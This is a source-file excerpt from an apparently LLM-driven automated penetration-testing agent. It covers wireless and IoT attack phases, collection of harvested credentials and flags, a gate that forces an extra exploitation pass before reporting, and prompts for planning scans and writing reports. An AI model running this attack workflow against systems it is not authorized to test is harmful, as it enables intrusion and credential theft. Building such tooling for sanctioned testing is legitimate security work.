                target_ssid  = wireless_cfg.get("ssid", ""),
                channel      = int(wireless_cfg.get("channel", 6)),
                wordlist     = wireless_cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"),
                do_evil_twin = wireless_cfg.get("evil_twin", False),
            )
        except Exception as exc:
            await self.emit_reasoning(
                step="wireless_agent_error", reasoning=f"WirelessAgent error: {exc}",
                decision="Continuing", next_action="Wireless phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "wireless", "result": "WirelessAgent executed",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: IoT Assessment ────────────────────────────────

    async def _phase_iot(self, target: str):
        """IoT device fingerprinting, default cred testing, protocol analysis and firmware CVEs."""
        await self.emit_reasoning(
            step       = "iot_start",
            reasoning  = (
                f"IoT assessment triggered for {target}. "
                "Will fingerprint device, test default credentials, probe IoT protocols "
                "(MQTT/CoAP/Modbus/RTSP/TR-069/UPnP), and correlate firmware CVEs."
            ),
            decision   = "Run IoTAgent: DeviceScan → DefaultCreds → ProtocolTest → FirmwareAnalysis",
            next_action= "IoTAgent dispatching subagents"
        )
        from agents.iot.iot_agent import IoTAgent
        agent = IoTAgent(
            session_id = self._session_id,
            target     = target,
            broadcast  = self.broadcast,
            db         = db.get_db(),
        )
        try:
            summary = await agent.run(
                open_ports = self._intel.get("open_ports", []),
                services   = self._intel.get("services", {}),
            )
            self._intel["attack_path"].append({
                "phase": "iot", "result": f"IoTAgent complete: {summary}",
                "ts": datetime.utcnow().isoformat()
            })
        except Exception as exc:
            await self.emit_reasoning(
                step="iot_agent_error", reasoning=f"IoTAgent error: {exc}",
                decision="Continuing", next_action="IoT phase skipped"
            )

    def _extract_internal_hosts(self, text: str) -> List[str]:
        """Extract internal IP addresses from nmap -sn output."""
        hosts = []
        for m in re.finditer(
            r'Nmap scan report for (?:\S+\s+)?\(?((?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3})\)?',
            text
        ):
            hosts.append(m.group(1))
        return list(set(hosts))

    # ─── PHASE: Evidence Collection ──────────────────────────

    async def _phase_evidence_collection(self, session_id: str, target: str):
        """
        Automated evidence collection: consolidates all captured evidence,
        captures final shell proof if shell was obtained,
        and structures everything for the report.
        """
        await self.set_status(AgentStatus.THINKING, "Collecting and structuring evidence")

        evidence_count = len(self._intel.get("evidence", []))

        # Capture attack path as narrative evidence
        attack_path = self._intel.get("attack_path", [])
        if attack_path:
            narrative = "\n".join(
                f"[{i+1}] [{s.get('phase','?').upper()}] {s.get('result','')}"
                for i, s in enumerate(attack_path)
            )
            await self._capture_evidence(
                phase        = "evidence_collection",
                evidence_type= "command_transcript",
                title        = "Complete Attack Narrative",
                content      = narrative,
                severity     = "info"
            )

        # Capture credentials found
        all_creds = self._intel.get("credentials", []) + [
            c for c in self._intel.get("default_creds_tried", [])
            if c.get("result","") in ("success","valid")
        ]
        if all_creds:
            cred_text = "\n".join(
                f"{c.get('username','?') or c.get('user','?')}:"
                f"{c.get('password','?') or c.get('pass','?')} "
                f"[{c.get('service','?')}]"
                for c in all_creds[:20]
            )
            await self._capture_evidence(
                phase        = "evidence_collection",
                evidence_type= "credential",
                title        = f"Credentials Harvested ({len(all_creds)} total)",
                content      = cred_text,
                severity     = "critical",
                mitre_tech   = "T1003"
            )

        # Capture flags as evidence
        flags_found = []
        if self._intel.get("user_flag"):
            flags_found.append(f"user.txt: {self._intel['user_flag']}")
            await self._capture_evidence(
                phase        = "evidence_collection",
                evidence_type= "shell_output",
                title        = "User Flag Captured",
                content      = self._intel["user_flag"],
                severity     = "critical",
                mitre_tech   = "T1005"
            )
        if self._intel.get("root_flag"):
            flags_found.append(f"root.txt: {self._intel['root_flag']}")
            await self._capture_evidence(
                phase        = "evidence_collection",
                evidence_type= "shell_output",
                title        = "Root Flag Captured",
                content      = self._intel["root_flag"],
                severity     = "critical",
                mitre_tech   = "T1005"
            )

        # Capture interesting files found
        ifiles = self._intel.get("interesting_files", [])
        if ifiles:
            await self._capture_evidence(
                phase        = "evidence_collection",
                evidence_type= "file_content",
                title        = f"Sensitive Files Discovered ({len(ifiles)})",
                content      = "\n".join(ifiles[:30]),
                severity     = "high",
                mitre_tech   = "T1083"
            )

        # Capture MITRE technique summary
        techniques = self._intel.get("mitre_techniques", [])
        if techniques:
            mitre_text = "\n".join(
                f"{t.get('id','?')} | {t.get('tactic','?')} | {t.get('name','?')} [{t.get('tool','')}]"
                for t in techniques
            )
            await self._capture_evidence(
                phase        = "evidence_collection",
                evidence_type= "command_transcript",
                title        = f"MITRE ATT&CK Techniques Used ({len(techniques)})",
                content      = mitre_text,
                severity     = "info"
            )

        new_count = len(self._intel.get("evidence", []))
        await self.emit_reasoning(
            step       = "evidence_collected",
            reasoning  = f"Evidence collection complete. {new_count - evidence_count} new items captured.",
            decision   = f"Total evidence: {new_count} items across all phases",
            next_action= "Generate comprehensive report",
            data       = {
                "total_evidence": new_count,
                "flags":          len(flags_found),
                "credentials":    len(all_creds),
                "mitre_techs":    len(techniques),
            }
        )

    # ─── PHASE: Reporting ────────────────────────────────────

    def _assess_compromise(self) -> Dict[str, Any]:
        """Honest verdict on whether the engagement actually achieved (or
        attempted) a compromise — as opposed to merely cataloguing version-
        matched CVEs.

        Levels:
          • ``compromised`` — a shell/elevated shell or a captured flag exists.
          • ``partial``     — real foothold *progress*: harvested credentials,
                              looted secrets, or a VERIFIED exploit/RCE finding.
          • ``recon_only``  — nothing but recon + unverified version CVEs.  This
                              is NOT a result; the final-compromise gate forces
                              one more genuine exploitation pass before reporting.

        Operator-PROVIDED credentials do not count as progress on their own —
        the point is to *use* them for a foothold.
        """
        it = self._intel

        shell = bool(it.get("shell_access") or it.get("elevated_shell"))
        flags = bool(it.get("user_flag") or it.get("root_flag"))

        harvested_creds = False
        for c in (it.get("credentials") or []):
            if isinstance(c, dict):
                src = str(c.get("source", "")).lower()
                if "operator" not in src:        # earned, not handed to us
                    harvested_creds = True
                    break

        loot = bool(it.get("loot"))

        verified_exploit = False
        for bucket in ("vulnerabilities", "web_vulns"):
            for v in (it.get(bucket) or []):
                if isinstance(v, dict) and (
                    v.get("verified") or v.get("exploited") or v.get("rce")
                ):
                    verified_exploit = True
                    break
            if verified_exploit:
                break

        compromised       = shell or flags
        foothold_progress = compromised or harvested_creds or loot or verified_exploit

        if compromised:
            level = "compromised"
        elif foothold_progress:
            level = "partial"
        else:
            level = "recon_only"

        return {
            "compromised":       compromised,
            "foothold_progress": foothold_progress,
            "level":             level,
            "shell":             shell,
            "flags":             flags,
            "harvested_creds":   harvested_creds,
            "loot":              loot,
            "verified_exploit":  verified_exploit,
        }

    async def _final_compromise_gate(self, session_id: str, target: str) -> None:
        """Refuse to report a pure recon/CVE-list as a finished engagement.

        ARGUS's objective is COMPROMISE, not vulnerability enumeration.  If the
        engagement is about to enter REPORTING with no shell, no captured flag,
        no harvested creds, no looted secret and no VERIFIED exploit — i.e. it
        only produced recon + unverified version CVEs — force ONE final,
        genuine exploitation pass (exploit phase → orchestrator → Tier-2 synth,
        plus any harvested-credential login).  One-shot and guarded so it can
        never loop.  Always records an honest ``engagement_outcome`` for the
        report.  Never raises into the teardown path.
        """
        try:
            assess = self._assess_compromise()
            self._intel["engagement_outcome"] = assess["level"]
            self._intel["compromised"]        = assess["compromised"]

            # Observability: ALWAYS surface the honest verdict (level + the
            # signals behind it) on EVERY path — including the early returns
            # below.  Previously the gate emitted nothing when it returned early,
            # so the log/UI/report could show an outcome with no visible basis
            # (the cancelled run's outcome looked opaque).  forced_push=False here;
            # the forced-push branch re-emits with forced_push=True if it fires.
            try:
                await self._emit("compromise_gate", {
                    "session_id":       session_id,
                    "outcome":          assess["level"],
                    "compromised":      assess["compromised"],
                    "shell":            assess["shell"],
                    "flags":            assess["flags"],
                    "harvested_creds":  assess["harvested_creds"],
                    "verified_exploit": assess["verified_exploit"],
                    "forced_push":      False,
                })
            except Exception:
                pass

            if assess["foothold_progress"] or getattr(self, "_final_push_done", False):
                # Either we made genuine progress, or we already spent our one
                # forced push — reporting is now warranted.
                return

            # User-cancel: do NOT fire a forced exploitation pass.  It would be
            # SIGKILLed mid-flight and burn the teardown window for nothing (a
            # cancelled run wasted time here, then reported an outcome that didn't
            # match the assessment).  Keep the honest recon_only outcome already
            # recorded above so the report label matches reality.
            if getattr(self, "_stop_requested", False):
                try:
                    await self.emit_reasoning(
                        step       = "compromise_gate",
                        reasoning  = ("Engagement was cancelled before a foothold. "
                                      "Skipping the forced exploitation pass and "
                                      "reporting the honest recon-only outcome."),
                        decision   = "gate skipped: user stop",
                        next_action= "Generate report (no-compromise)",
                    )
                except Exception:
                    pass
                return

            self._final_push_done = True
            await self.emit_reasoning(
                step       = "compromise_gate",
                reasoning  = (
                    "Engagement reached REPORTING with NO shell, NO flag, NO "
                    "harvested credentials and NO verified exploit — only recon "
                    "and unverified version CVEs.  That is a vulnerability list, "
                    "not a compromise.  Forcing a final exploitation pass against "
                    "the real attack surface before any report is written."
                ),
                decision   = "FORCE final exploitation pass (no foothold yet)",
                next_action= "Re-run exploit phase + orchestrator + synth against the live app/creds",
            )
            try:
                await self._emit("compromise_gate", {
                    "session_id": session_id,
                    "outcome_before": assess["level"],
                    "forced_push":    True,
                })
            except Exception:
                pass

            # The one genuine push: re-enter the exploit phase (orchestrator +
            # synth + credentialed-login path), then let any background subagent
            # finish before we judge the result.
            try:
                await self._phase_exploit(target)
            except Exception as exc:
                import logging as _l
                _l.getLogger(__name__).warning("[compromise_gate] forced exploit error: %s", exc)
            try:
                await self._wait_for_agents_idle(timeout=180.0)
            except Exception:
                pass

            assess2 = self._assess_compromise()
            self._intel["engagement_outcome"] = assess2["level"]
            self._intel["compromised"]        = assess2["compromised"]
            await self.emit_reasoning(
                step       = "compromise_gate_result",
                reasoning  = (
                    f"Post-push verdict: {assess2['level']} "
                    f"(shell={assess2['shell']} flags={assess2['flags']} "
                    f"creds={assess2['harvested_creds']} "
                    f"verified_exploit={assess2['verified_exploit']})."
                ),
                decision   = (
                    "Compromise achieved — proceeding to report"
                    if assess2["compromised"]
                    else "Still no foothold — report will be flagged NO-COMPROMISE"
                ),
                next_action= "Generate report",
            )
        except Exception as exc:
            import logging as _l
            _l.getLogger(__name__).warning("[compromise_gate] non-fatal: %s", exc)

    async def _phase_reporting(self, session_id: str, target: str):
        await self._advance_phase(AttackPhase.REPORTING)
        await self.set_status(AgentStatus.THINKING, "Generating executive report")

        # Guard every DB result: these can return None, and `None[:12]` /
        # `None.get(...)` is the recurring 'NoneType object is not subscriptable'
        # crash that has aborted report generation on every recent run.
        findings = await db.get_findings(session_id) or []
        flags    = await db.get_flags(session_id) or []
        summary  = await db.get_findings_summary(session_id) or {}

        # Build structured finding details for the LLM
        finding_details = []
        for f in findings[:12]:
            f     = f or {}
            sev   = (f.get("severity") or "?").upper()
            title = f.get("title") or "?"
            host  = f.get("host") or target
            port  = f.get("port") or ""
            svc   = f.get("service") or ""
            cves  = ", ".join((f.get("cves") or [])[:3])
            desc  = (f.get("description") or "")[:200]
            rem   = ((f.get("extra") or {}).get("remediation") or "")[:150]
            line  = f"[{sev}] {title}"
            if port: line += f" — {host}:{port}"
            if svc:  line += f" ({svc})"
            if cves: line += f" — CVEs: {cves}"
            if desc: line += f"\n       Description: {desc}"
            if rem:  line += f"\n       Remediation: {rem}"
            finding_details.append(line)

        flag_lines = []
        for fl in flags:
            flag_lines.append(f"  [{fl.get('flag_type','?').upper()}] {fl.get('value','?')} "
                              f"(found at {fl.get('location','?')})")

        attack_path_lines = []
        for i, step in enumerate(self._intel.get("attack_path") or [], 1):
            step = step or {}
            attack_path_lines.append(
                f"  {i}. [{(step.get('phase') or '?').upper()}] {step.get('result') or ''}"
            )

        intel_ctx = self._intel_summary()
        kb = await self._kb(
            f"penetration test report {self._intel.get('os_guess','')} "
            f"{_fmt_svcs(self._intel.get('services',{}))}",
            top_k=3
        )

        # Load evidence and MITRE data for richer report
        evidence_items = []
        mitre_mappings = []
        try:
            evidence_items = await db.get_evidence(session_id) or []
            mitre_mappings = await db.get_mitre_mappings(session_id) or []
        except Exception:
            evidence_items = self._intel.get("evidence") or []
            mitre_mappings = self._intel.get("mitre_techniques") or []

        # Build MITRE ATT&CK table
        mitre_lines = []
        seen_techniques = set()
        for t in mitre_mappings:
            tid = t.get("technique_id") or t.get("id","?")
            if tid not in seen_techniques:
                seen_techniques.add(tid)
                tname  = t.get("technique_name") or t.get("name","?")
                tactic = t.get("tactic","?")
                tool   = t.get("tool_used") or t.get("tool","?")
                mitre_lines.append(f"  {tid} | {tactic} | {tname} | [{tool}]")

        # Build evidence summary
        evidence_lines = []
        for ev in evidence_items[:15]:
            etype   = ev.get("evidence_type","?")
            etitle  = ev.get("title","?")
            ephase  = ev.get("phase","?")
            evidence_lines.append(f"  [{ephase}] [{etype}] {etitle}")

        # Attack tree summary
        attack_tree = self._intel.get("attack_tree") or {}
        tree_summary = ""
        if attack_tree:
            opt = attack_tree.get("optimal_path",[])
            nodes = {n["id"]: n for n in attack_tree.get("attack_nodes",[])}
            if opt:
                chain = " → ".join(nodes.get(nid,{}).get("technique",nid) for nid in opt)
                tree_summary = f"Optimal attack chain: {chain}"

        report_prompt = f"""You are a senior penetration tester writing a detailed engagement report.
You MUST base every statement on the actual findings provided below.
Do NOT invent findings. Do NOT use generic filler text.

{intel_ctx}

FINDINGS ({summary.get('total',0)} total):
  Critical: {summary.get('critical',0)} | High: {summary.get('high',0)} | Medium: {summary.get('medium',0)} | Low: {summary.get('low',0)}

DETAILED FINDINGS:
{chr(10).join(finding_details) if finding_details else "  No findings recorded."}

FLAGS CAPTURED:
{chr(10).join(flag_lines) if flag_lines else "  No flags captured."}

ATTACK PATH TAKEN:
{chr(10).join(attack_path_lines) if attack_path_lines else "  No attack path recorded."}

SHELL ACCESS: {'YES — compromised as: ' + str(self._intel.get('current_user','?')) if self._intel.get('shell_access') else 'No shell obtained'}

ENGAGEMENT OUTCOME: {str(self._intel.get('engagement_outcome','recon_only')).upper()} (compromised={bool(self._intel.get('compromised'))})
  NOTE: if outcome is RECON_ONLY, NO foothold was achieved — the listed CVEs
  are UNVERIFIED version matches, NOT confirmed/exploited vulnerabilities. The
  report MUST state plainly that the target was NOT compromised and must NOT
  imply the version-matched CVEs were exploited.

ATTACK TREE ASSESSMENT:
{tree_summary if tree_summary else "  Not available"}

EVIDENCE COLLECTED:
{chr(10).join(evidence_lines) if evidence_lines else "  No structured evidence"}

MITRE ATT&CK TECHNIQUES USED:
  ID      | Tactic                  | Technique                        | Tool
{chr(10).join(mitre_lines) if mitre_lines else "  None mapped"}

LATERAL MOVEMENT:
  Additional hosts found: {self._intel.get('lateral_targets', [])}
  Pivot paths: {len(self._intel.get('pivot_paths',[]))} identified
{kb}

Write a professional penetration test report. Reference SPECIFIC findings, ports, CVEs, and services by name.
Use the EXACT data above — do not generalise or invent.

Structure your response EXACTLY as:

## EXECUTIVE SUMMARY
(2-3 paragraphs for non-technical management. Name the target, what was found, business risk.)

## CRITICAL FINDINGS
(For each critical/high finding: exact port/service/CVE, proof of exploitation, business impact.)

## ATTACK NARRATIVE
(Step-by-step story of the engagement. Use the attack path. Name specific tools and findings.)

## MITRE ATT&CK COVERAGE
(Table: Tactic | Technique ID | Technique Name | Tool Used | Outcome)

## EVIDENCE SUMMARY
(List key evidence items captured during the engagement.)

## REMEDIATION ROADMAP
(Top 5 prioritised fixes. Priority level | What to fix | Exact remediation | Timeline)

## RISK RATING
Overall risk: [Critical/High/Medium/Low] — one paragraph justification based on findings."""

        try:
            report_text = await self.think(report_prompt)
        except RuntimeError:
            report_text = "LLM unavailable — manual report generation required."

        await self._emit("report_ready", {
            "summary":     report_text,
            "findings":    summary,
            "flags":       flags,
            "intel":       self._intel,
            "attack_path": self._intel.get("attack_path", [])
        })

    # ─── LLM Planning Methods ─────────────────────────────────

    async def _parse_operator_context(
        self,
        notes:       str,
        scope:       str,
        target_type: str = "unknown",
    ):
        """
        Use the LLM to understand operator intent from free-form notes.

        Returns an EngagementContext with:
          - engagement_type  (pentest / ctf / forensics / network_analysis / …)
          - objectives       (ordered list of tasks/questions)
          - constraints      (rules of engagement)
          - tools_preferred / tools_excluded
          - approach_summary (how to tackle this)
          - clarifying_questions (ask operator if ambiguous)

        Falls back to a default pentest context if LLM is unavailable.
        """
        from agents.reasoning.engagement_context import EngagementContext

        all_text = "\n".join(filter(None, [notes, scope]))
        if not all_text.strip():
            return EngagementContext.default_pentest()

        prompt = f"""You are an intelligent engagement planner for ARGUS, an adaptive security operations platform.
Analyze the operator's notes and derive a precise, structured engagement context.

=== OPERATOR NOTES ===
{notes or "(none)"}

=== SCOPE / ADDITIONAL CONTEXT ===
{scope or "(none)"}

=== TARGET TYPE ===
{target_type}

Determine:
1. What TYPE of engagement this is
2. What SPECIFIC objectives need to be achieved (ordered by priority)
3. What TOOLS make sense vs. should be avoided
4. What APPROACH to take
5. Any CLARIFYING QUESTIONS needed (only if genuinely ambiguous — max 3)

Respond with JSON only — no markdown, no prose:
{{
  "engagement_type": "pentest|ctf|forensics|network_analysis|malware_analysis|compliance|bug_bounty|red_team|custom",
  "title": "One-line description of this engagement",
  "context_summary": "2-3 sentence explanation of what the operator wants",
  "objectives": [
    {{"task": "Specific task or question to answer", "section": "Optional phase label", "priority": 1}}
  ],
  "constraints": ["Any rules of engagement, scope limits, or restrictions mentioned"],
  "tools_preferred": ["Tools that are appropriate for this engagement"],
  "tools_excluded": ["Tools that must NOT be used"],
  "approach_summary": "How ARGUS should approach this — what to look for, in what order",
  "clarifying_questions": ["Question if critical info is missing"]
}}

RULES:
- engagement_type MUST be one of the listed values
- For CTF: extract every question/flag/puzzle as a separate objective, preserve order and section groupings
- For forensics: objectives = artifacts to extract, timeline events, IOCs to find
- For network_analysis: objectives = anomalies, suspicious hosts/protocols, C2 indicators
- For malware_analysis: objectives = capabilities, IOCs, persistence mechanisms, C2
- For compliance: objectives = specific controls to check
- tools_excluded for forensics/malware/network_analysis MUST include: nmap, metasploit, hydra, sqlmap, gobuster
- tools_excluded for compliance MUST include: metasploit, sqlmap, hydra
- Only include clarifying_questions if the engagement type or a key objective is genuinely unclear"""

        system = (
            "You are an expert security engagement planner. "
            "Read operator instructions precisely and produce structured JSON. "
            "JSON only — no markdown fences, no prose."
        )

        import logging as _log
        try:
            raw = await self.think_json(prompt, system)
            if raw and isinstance(raw, dict):
                ctx = EngagementContext.from_dict(raw)
                _log.getLogger(__name__).info(
                    "Engagement context: type=%s, objectives=%d, questions=%d",
                    ctx.engagement_type, len(ctx.objectives), len(ctx.clarifying_questions)
                )
                return ctx
        except Exception as e:
            _log.getLogger(__name__).warning("Operator context parsing failed: %s", e)

        # Fallback: try basic regex extraction so we never return empty for CTF notes
        return EngagementContext.default_pentest()

    def answer_operator_question(self, answers: dict) -> None:
        """
        Called when the operator submits answers to clarifying questions.
        Injects the answers as operator guidance so the reasoning loop picks them up.
        answers = {"0": "answer to question 0", "1": "answer to question 1", ...}
        """
        ctx_dict = self._intel.get("engagement_context", {})
        questions = ctx_dict.get("clarifying_questions", [])
        if not questions:
            return

        note_parts = ["Operator answered clarifying questions:"]
        for idx_str, answer in answers.items():
            try:
                q = questions[int(idx_str)]
                note_parts.append(f"  Q: {q}")
                note_parts.append(f"  A: {answer}")
            except (IndexError, ValueError):
                note_parts.append(f"  Additional note: {answer}")

        # Clear questions so the banner disappears
        ctx_dict["clarifying_questions"] = []
        self._intel["engagement_context"] = ctx_dict

        # Inject as high-priority guidance
        self.inject_guidance({
            "directive": "add_note",
            "note":      "\n".join(note_parts),
        })

    def _safe_llm_result(self, result: any, default: dict = None) -> dict:
        """
        Ensure any think_json result is a usable dict.
        Handles: None return, list return (LLM wrapped in []), parse_error dicts.
        Also normalises all null-valued list fields to empty lists.
        """
        if result is None:
            return default or {}
        if isinstance(result, list):
            # LLM returned a JSON array - try to use first element if it's a dict
            if result and isinstance(result[0], dict):
                result = result[0]
            else:
                return default or {}
        if not isinstance(result, dict):
            return default or {}
        # Normalise: replace None values for known list fields with []
        LIST_FIELDS = [
            "steps", "checks", "tools", "searches", "attack_vectors",
            "attack_nodes", "attack_chains", "optimal_path", "phases",
            "priority_services", "high_value_services", "immediate_wins",
            "priority_attack_paths", "immediate_actions", "goals",
            "vectors", "manual_checks", "owasp_checks", "exploits",
            "exploit_modules", "manual_exploits", "expected_vulns",
            "priority_targets", "credentials_found", "files_accessible",
            "gtfobins_candidates", "alternative_paths",
        ]
        for field in LIST_FIELDS:
            if field in result and result[field] is None:
                result[field] = []
        # Normalise: replace None for known string fields with ""
        STR_FIELDS = [
            "reasoning", "summary", "assessment", "strategy", "rationale",
            "exploit_recommendation", "next_phase_focus", "next_step",
            "decision", "useful_info", "finding_title", "finding_severity",
            "attack_surface", "primary_strategy", "optimal_chain_id",
            "assessment_summary", "current_user", "user_flag", "shell_id",
        ]
        for field in STR_FIELDS:
            if field in result and result[field] is None:
                result[field] = ""
        return result

    async def _create_master_plan(self, target: str, target_type: str) -> Dict:
        kb = await self._kb(f"pentest {target_type} attack plan methodology", top_k=3)
        intel_ctx = self._intel_summary()
        operator_guidance = ""
        if getattr(self, '_notes', ''):
            operator_guidance += f"\nOPERATOR NOTES (MUST follow these instructions): {self._notes}"
        if getattr(self, '_scope', ''):
            operator_guidance += f"\nSCOPE/FOCUS (prioritize these areas): {self._scope}"

        prompt = f"""You are a master penetration tester. Create a DETAILED, SPECIFIC structured plan for testing:
Target: {target}
Type: {target_type}{operator_guidance}
{intel_ctx}
{kb}

PLANNING REQUIREMENTS:
- If operator notes specify a focus area (e.g., "focus on web app port 80"), prioritize those tools first
- For web targets: ALWAYS include OWASP Top 10 testing phases (injection, broken access control, auth failures, etc.)
- For network targets: Include service-specific enumeration and CVE-targeted exploitation
- Be SPECIFIC about which tools and techniques to use for this target type
- Include web-specific phases if ANY HTTP/HTTPS ports are likely present

Return JSON:
{{
  "assessment_type": "network|web|ctf|ad|fullscope",
  "rationale": "specific reasoning for this assessment type based on target",
  "target_profile": "what you expect to find and why",
  "operator_guidance_followed": "how operator notes are being incorporated",
  "phases": [
    {{"phase": "recon", "tools": ["nmap -sV -sC", "whatweb", "gobuster"], "reasoning": "comprehensive service and tech detection"}},
    {{"phase": "vuln_id", "tools": ["nikto", "searchsploit", "nmap --script vuln"], "reasoning": "targeted vulnerability identification"}},
    {{"phase": "web_testing", "tools": ["gobuster", "sqlmap", "ffuf"], "reasoning": "OWASP Top 10 coverage if web services found"}}
  ],
  "attack_hypothesis": "most specific likely attack path based on target type",
  "priority_services": ["http", "smb"],
  "owasp_focus": ["A01-BrokenAccessControl", "A03-Injection", "A05-Injection"],
  "ctf_flags_expected": true,
  "requires_web_testing": true,
  "risk_level": "high|medium|low"
}}"""
        return await self.think_json(prompt)

    # ─────────────────────────────────────────────────────────────────
    #  MCP TOOL CATALOG LOADER
    # ─────────────────────────────────────────────────────────────────

    async def _load_tool_catalog(self) -> None:
        """Fetch the full tool list from mcp-server.js and cache it.

        Populates ``self._tool_catalog`` (dict) and ``self._tool_catalog_text``
        (pre-formatted string ready to drop into LLM planning prompts).
        Called once at session start.  Failure is non-fatal — planning
        prompts fall back to their hardcoded hint lists if the catalog is
        empty.
        """
        import httpx
        try:
            from agents.base_agent import MCP_URL
        except Exception:
            MCP_URL = "http://localhost:3000"
        # B2 — MCP server only accepts POST `/` with JSON-RPC `{method: "tools/list"}`.
        # The previous GET `/tools/list` returned HTTP 405 Method Not Allowed
        # on every session start, leaving _tool_catalog empty so the LLM
        # planner had no idea which tools were actually available and emitted
        # references to tools that aren't installed.
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                r = await client.post(f"{MCP_URL}/", json={
                    "method": "tools/list",
                    "params": {},
                })
                data = r.json() if r.status_code == 200 else {}
        except Exception as exc:
            await self.emit_reasoning(
                step="tool_catalog_load",
                reasoning=f"MCP catalog unreachable: {exc}",
                decision="Planning prompts will use hardcoded tool hints",
                next_action="Continue without full catalog"
            )
            return

        # MCP /tools/list returns {"tools": [...]} — possibly nested under
        # "result" depending on JSON-RPC response shape.  Handle both forms.
        if isinstance(data, dict) and "result" in data and isinstance(data["result"], dict):
            data = data["result"]
        raw = data.get("tools") or data if isinstance(data, (list, dict)) else []
        if isinstance(raw, dict):
            raw = raw.get("tools", [])
        self._tool_catalog = {
            (t.get("name") or "").strip(): t
            for t in raw if isinstance(t, dict) and t.get("name")
        }

        # Group by category for compact LLM context
        by_cat: Dict[str, List[str]] = {}
        for name, meta in self._tool_catalog.items():
            cat = (meta.get("category") or "misc").lower()
            by_cat.setdefault(cat, []).append(name)
        lines = [f"AVAILABLE KALI TOOLS ({len(self._tool_catalog)} total, via MCP server):"]
        for cat in sorted(by_cat):
            tools = sorted(by_cat[cat])
            lines.append(f"  [{cat}] " + ", ".join(tools))
        self._tool_catalog_text = "\n".join(lines)

        await self.emit_reasoning(
            step="tool_catalog_loaded",
            reasoning=f"Loaded {len(self._tool_catalog)} tools across {len(by_cat)} categories",
            decision="LLM planners will see the full Kali arsenal",
            next_action="Proceed to pentest phases",
            data={"tool_count": len(self._tool_catalog), "categories": sorted(by_cat.keys())}
        )

    def _tools_hint(self, max_chars: int = 3500) -> str:
        """Return the cached tool catalog text, truncated for prompt safety."""
        if not self._tool_catalog_text:
            return ""
        txt = self._tool_catalog_text
        if len(txt) > max_chars:
            txt = txt[:max_chars] + "\n  ... (truncated — full list available)"
        return txt

    async def _llm_plan_recon(self, target: str, plan: Dict) -> Dict:
        already_run = list(self._used_tools.keys())
        _svc_hint = _safe_join(plan.get("priority_services", []))
        kb = await self._kb(
            f"recon reconnaissance {plan.get('assessment_type','')} {_svc_hint}",
            phase="recon", top_k=3
        )
        intel_ctx = self._intel_summary()
        prompt = f"""Plan the reconnaissance phase for target: {target}
Assessment type: {plan.get('assessment_type', 'unknown')}
Priority services: {plan.get('priority_services', [])}
{f"OPERATOR GUIDANCE: {self._notes}" if getattr(self, '_notes', '') else ""}
{f"SCOPE FOCUS: {self._scope}" if getattr(self, '_scope', '') else ""}
Tools already used this session (DO NOT repeat these): {already_run}
{intel_ctx}
{kb}
Pick DIFFERENT tools from: nmap, masscan, rustscan, fping, whatweb, wafw00f, dnsrecon, fierce, amass, smbmap, onesixtyone, snmpwalk
OS-AWARE RULES (current os_guess: {self._intel.get('os_guess','unknown')}):
- If target is Windows: use crackmapexec, nmap smb scripts, smbmap — DO NOT use enum4linux (Linux/Samba only)
- If target is Linux/unknown: enum4linux is allowed for SMB ports

Return JSON with SPECIFIC nmap flags, tool commands, and reasoning.
Use at most 4 steps — prefer speed over exhaustiveness:
{{
  "strategy": "passive|active|aggressive",
  "reasoning": "why this strategy",
  "steps": [
    {{
      "tool": "nmap",
      "args": "-sS -sV --open -p- --min-rate 5000 {target}",
      "purpose": "Full TCP scan with service detection",
      "timeout": 300
    }},
    {{
      "tool": "whatweb",
      "args": "-a 3 http://{target}",
      "purpose": "Web technology detection",
      "timeout": 30
    }}
  ]
}}"""
        return await self.think_json(prompt)

    async def _llm_interpret_recon(self, target: str, result: Dict) -> Dict:
        ports    = result.get("open_ports", [])
        svcs     = result.get("services", {})
        _svc_str = _fmt_svcs(svcs)
        _os      = result.get("os_guess", "unknown")
        svc_vers = result.get("service_versions", {})
        login_pg = result.get("login_pages", [])
        users    = result.get("users", [])
        shares   = result.get("shares", [])
        ifiles   = result.get("interesting_files", [])

        kb = await self._kb(
            f"recon results {_svc_str} {_os} attack surface enumeration",
            top_k=3,
        )

        # Build a rich service version block for the LLM
        svc_detail_lines = []
        for port, ver in list(svc_vers.items())[:10]:
            svc_detail_lines.append(f"  port {port}: {ver}")

        prompt = f"""You are a senior penetration tester. Analyse these reconnaissance results for {target}
and identify the most promising attack vectors. Be SPECIFIC — name exact services, versions, and attack paths.

TARGET PROFILE:
- OS: {_os}
- Open ports: {sorted(ports)}
- Service versions:
{chr(10).join(svc_detail_lines) if svc_detail_lines else "  (none extracted yet)"}

ENUMERATION FINDINGS:
- Web paths found: {result.get('web_paths', [])[:15]}
- Login pages: {login_pg}
- Interesting files: {ifiles[:10]}
- Users discovered: {users}
- SMB shares: {shares}
- Technologies: {result.get('technologies', [])[:8]}

{kb}

Based on the above, identify:
1. Which services are most likely vulnerable and WHY (name specific version CVEs if applicable)
2. Which login pages exist and what credential attacks to try
3. Whether SMB shares are accessible and what they contain
4. What the most efficient path to initial access looks like

Return JSON:
{{
  "summary": "Specific description of what was found — name exact services, versions, interesting paths",
  "assessment": "Detailed attack surface description with specific vulnerabilities likely present",
  "interesting_ports": [most interesting port numbers as integers],
  "attack_surface": "network|web|smb|mixed|ftp",
  "next_phase_focus": "exact focus for vuln scan based on what was found",
  "high_value_services": ["service:port eg apache:80", "smb:445"],
  "immediate_wins": ["list of quick wins to try — default creds, anon FTP, readable shares etc"],
  "priority_attack_paths": [
    "1. Check FTP anonymous login on port 21",
    "2. Test login page at /admin with default creds",
    "3. Enumerate SMB share BACKUP for sensitive files"
  ]
}}"""
        return await self.think_json(prompt)

    async def _llm_plan_vuln_scan(self, target: str) -> Dict:
        ports = self._intel.get("open_ports", [])
        svcs  = self._intel.get("services", {})
        already_run = list(self._used_tools.keys())
        ports_str = ",".join(str(p) for p in ports[:30])
        _svc_str  = _fmt_svcs(svcs)
        _os       = self._intel.get("os_guess", "unknown")
        kb = await self._kb(
            f"vulnerability scan {_svc_str} {_os} CVE exploit",
            top_k=4
        )
        svc_versions = self._intel.get("service_versions", {})
        svc_ver_lines = [f"  {p}: {v}" for p,v in list(svc_versions.items())[:10]]
        login_pages  = self._intel.get("login_pages", [])
        users        = self._intel.get("users", [])
        intel_ctx    = self._intel_summary()

